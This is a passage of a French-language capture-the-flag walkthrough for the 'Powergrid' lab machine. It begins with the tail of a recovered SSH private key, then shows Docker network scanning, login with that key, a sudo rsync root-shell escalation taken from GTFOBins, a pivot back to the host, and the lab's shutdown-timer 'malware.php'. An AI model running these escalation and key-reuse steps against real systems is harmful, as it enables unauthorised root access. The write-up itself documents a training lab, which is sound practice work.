gfAFxdsKkPML+bh0NGTLMAAAADAQABAAACAFXT9qMAUsKZvpX7HCbQ8ytInoUFY2ZBRxcb
euWi2ddzJ48hCUyPOH+BCOs2hHITE4po1SDL+/By96AEf1KGXMAZczPepBLEubBkh3w+V0
b+RSgdIPBSoQ9b0rJjRFAE/WaO5SuCTkgaFW0ZcyNRBcJC3kBU8SX+waeoUTjG29lvGsM0
AKlC/VdcjQdstXiFEinEU4ALIyZg6Pkim/Et3v3gMGEkG4hN0mwiIVI5jvLtKtd+5opLKM
KspBSwz1m8JxX48WERiJf9pmf8WuYTql3D4vbhJ14gLoEP0TwycQe089xxGM9QMafBIvQG
OSfyo81JmqoXpRy+wyhkTKoNivBxENOATDy3bG0z5bfRQAlz7o5sjLh3wEMNq+gbQsmQBB
mDgD4wA4c0/aTl7/UQXdnkcI+/+fOwfP0UOFZcWjO6ZORJloKjdA2nvVbvox+6ZyRrP3AS
FWt7DYOrBbi3cJhjyJSq38qQpG1Yy0DbhMKJGMQJbjCKf3bw+cDSsu5WiKK7y+3LFns0Jd
NNflVRMkCERdAxWRE7Ga/1r6/TweLRCQkyGGq93sETeP373I4v35BVe6rMHTZ3U2rZ8cr/
71suv4FGP4LmvEqd/S00mgXngHLK8/KtjVKqIZAD8+ft7mTXE9hyNPV/QLdbm/IJ5C5Fdf
BEdelzvB0Jp73ylHdhAAABACBdUjdZpPwEYyUnKRp3Xs5dEqt3IHuUV37BtAREjWT5X3bN
afjtFDJ4A+ThPG6WImjP2IFaXWrZ0fgiSi8i8BWe3Hq6oZaApVPB7S7fxhcUm6z7TRwrUp
HOZrbeZ7wN6CTD5VjvL4B8Q9C8AyoNg/AtJKhxYjmPN+hoaShcKCjuezwKo0E3C/Q9Mf/X
9ARR0Tfklaa2LapipPK2e3td/I84YJd7GyWxCDAmGw5RSu2cFfcwevd56CzMreJBSv7Kp8
2eX+WC+6fAomSD3h/BBL71mS14hWx5N+vTxLzjqg94VfSYEE5qGvTxZRFKf/bv05sGtv/R
sK58Zhl2QfA60QAAAAEBANxmyymkC/t43RF1Pgv7lgzj7jyKMoXWcATvG3Rn026LAINMNR
AIsggMIbDi2k7K0N4jZxUmvgHFS/IVkoAMOoqbopH3R/S/oDY6gBbqkZdxHYrzAFFAI7YU
mUndb4CXRIEwjf5kRMBVIL+Ws/aWlMvuegSmB06eBsaP7lIwPZSRYcC6pr3yg5YV2I3p7k
WWmuMlC9kvOBIl99ue8k9rGuQW6JBXZuJglHHSZk5t2cR3jxmz9KitZ96wMludkGXKHAOr
FkX8DSpYQlPOSEMRBizOf5LU6UEZTD8sDYT9DzqhRM98TaiQc1m/YD2r/Lg6A7QeyEnyJX
DqZ/48FybkHasAAAEBAMyDvNem68DH64iQbK6oGITTdHJxHtp/qKnIKGOfEdrjBsYJWXj3
rL3F6VHrWxNmj6mVNKs2SQpLptIKclmW8+UlBYYtf4LgTzRRWMv3Ke9HYoXSpNkIIKYG2+
TWeH1nMQDeqph1f3vMzNA6SScMpipuV5ofaENArOh6kCTFXVVuGHjoZgbgCg73FXBaTYid
Ne1y8L/lwpsPLWevpsm5DLwUrqcDaDMMd6CFjSjcKrj99DGy7oKwvkz+4wxbsumvSmUTiY
XZVmZsuWDJbJkLzjKs6kJg14zcXm+fDPeuSVLIQ1zd4C39QzD6CGKyXVn2zlFCs46g1Z6j
31r4Qk2RNRkAAAANcDQ4QHBvd2VyZ3JpZAECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
gpg: Signature faite le mar. 19 mai 2020 21:17:30 CEST
gpg:                avec la clef RSA 76234C43E84EFC92904CAC8C73D19820E29199BD
gpg: Bonne signature de « P48 Hacker <p48@powergrid> » [inconnu]
gpg: Attention : cette clef n'est pas certifiée avec une signature de confiance.
gpg:             Rien n'indique que la signature appartient à son propriétaire.
      76234C43E84EFC92904CAC8C73D19820E29199BD
```

Le message mentionnait un serveur SSH présent sur une autre machine. La machine courante a un SSH en écoute sur une interface Docker, toutefois ce n'est pas la machine qui nous intéresse ici :

```console
www-data@powergrid:/var/www/html$ ss -lntp
State               Recv-Q              Send-Q                             Local Address:Port                              Peer Address:Port                                                                      
LISTEN              0                   128                                   172.17.0.1:22                                     0.0.0.0:*                                                                         
LISTEN              0                   10                                     127.0.0.1:25                                     0.0.0.0:*                                                                         
LISTEN              0                   100                                      0.0.0.0:993                                    0.0.0.0:*                                                                         
LISTEN              0                   80                                     127.0.0.1:3306                                   0.0.0.0:*                                                                         
LISTEN              0                   10                                     127.0.0.1:587                                    0.0.0.0:*                                                                         
LISTEN              0                   100                                      0.0.0.0:143                                    0.0.0.0:*                                                                         
LISTEN              0                   100                                         [::]:993                                       [::]:*                                                                         
LISTEN              0                   128                                            *:31337                                        *:*                  users:(("reverse-sshx64",pid=12035,fd=3))              
LISTEN              0                   100                                         [::]:143                                       [::]:*                                                                         
LISTEN              0                   128                                            *:80                                           *:*
```

Notre IP locale étant `.1`, Docker ne cherche généralement pas bien loin pour les autres machines :

```console
p48@powergrid:/var/www/html$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.288 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.073 ms
^C
--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 48ms
rtt min/avg/max/mdev = 0.073/0.180/0.288/0.108 ms
p48@powergrid:/var/www/html$ ping 172.17.0.3
PING 172.17.0.3 (172.17.0.3) 56(84) bytes of data.
^C
--- 172.17.0.3 ping statistics ---
2 packets transmitted, 0 received, 100% packet loss, time 30ms

p48@powergrid:/var/www/html$ ping 172.17.0.4
PING 172.17.0.4 (172.17.0.4) 56(84) bytes of data.
^C
--- 172.17.0.4 ping statistics ---
1 packets transmitted, 0 received, 100% packet loss, time 0ms
```

Comme attendu, avec la clé SSH, je peux me connecter sur `.2` avec le compte `p48`. Ce dernier a une permission `sudo` et un flag :

```console
www-data@powergrid:/var/www/html$ ssh -i ssh.key  -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null p48@172.17.0.2
Could not create directory '/var/www/.ssh'.
Warning: Permanently added '172.17.0.2' (ECDSA) to the list of known hosts.
Linux ef117d7a978f 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed May 20 00:22:30 2020 from 172.17.0.1
p48@ef117d7a978f:~$ id
uid=1000(p48) gid=1000(p48) groups=1000(p48)
p48@ef117d7a978f:~$ sudo -l
Matching Defaults entries for p48 on ef117d7a978f:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User p48 may run the following commands on ef117d7a978f:
    (root) NOPASSWD: /usr/bin/rsync
p48@ef117d7a978f:~$ ls -al
total 20
drwxr-xr-x 3 p48  p48  4096 May 19  2020 .
drwxr-xr-x 1 root root 4096 May 19  2020 ..
lrwxrwxrwx 1 p48  p48     9 May 19  2020 .bash_history -> /dev/null
drwx------ 2 p48  p48  4096 May 20  2020 .ssh
-rw------- 1 p48  p48   803 May 19  2020 .viminfo
-rw-r--r-- 1 p48  p48   112 May 19  2020 flag2.txt
p48@ef117d7a978f:~$ cat flag2.txt 
047ddcd1f33dfb7d80da3ce04e89df73

Well done for getting flag 2. It looks like this user is fairly unprivileged
```

Une fois la permission sudo détournée (thx [GTFObin](https://gtfobins.github.io/gtfobins/rsync/)), j'obtiens un 3ème flag :

```console
p48@ef117d7a978f:~$ sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
# id
uid=0(root) gid=0(root) groups=0(root)
# cd
# ls
flag3.txt
# cat flag3.txt
009a4ddf6cbdd781c3513da0f77aa6a2

Well done for getting the third flag. Are you any good at pivoting backwards?
```

Il faut alors se rappeller le message :

> The backup server has root access to this main server

Comme on est dans un container, on doit joindre l'adresse docker de l'hôte (en `.1`) :

```console
root@ef117d7a978f:~# ssh root@172.17.0.1    
Linux powergrid 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May 26 18:15:49 2020
root@powergrid:~# ls
 chown.sh   flag4.txt   malware.php  'ystemctl status docker'
root@powergrid:~# cat flag4.txt 
f5afaf46ede1dd5de76eac1876c60130

Congratulations. This is the fourth and final flag. Make sure to delete /var/www/html/startTime.txt to stop the attack (you will need to run chattr -i /var/www/html/startTime.txt first).

 _._     _,-'""`-._
(,-.`._,'(       |\`-/|
    `-.-' \ )-`( , o o)
          `-    \`_`"'-

This CTF was created by Thomas Williams - https://security.caerdydd.wales

Please visit my blog and provide feedback - I will be glad to hear your comments.
```

C'est donc finit.

### Sous le capot

En regardant les scripts présents, on voit pourquoi on ne pouvait pas déplacer `startTime.txt` :

```console
root@powergrid:~# cat chown.sh
chown root:root /var/www/html/startTime.txt && chattr +i /var/www/html/startTime.txt
root@powergrid:~# cat malware.php
<?php

// Line that sends instruction to power grid to shutdown
//
// Followed by code to shut this server down:

if (file_exists('/var/www/html/startTime.txt')) {
        $file = fopen('/var/www/html/startTime.txt', 'r');
        $text = fread($file,filesize('/var/www/html/startTime.txt'));
        $now = new DateTime( 'NOW' );
        $start = new DateTime($text);
        $differenceInSeconds = $now->getTimeStamp() - $start->getTimeStamp();
        if ($differenceInSeconds > 10800) {
                exec('/usr/sbin/shutdown -h now');
        }
}
?>
```

Le fichier disposait d'un flag immuable (via `chattr`) qui empêchait le renommage du fichier.
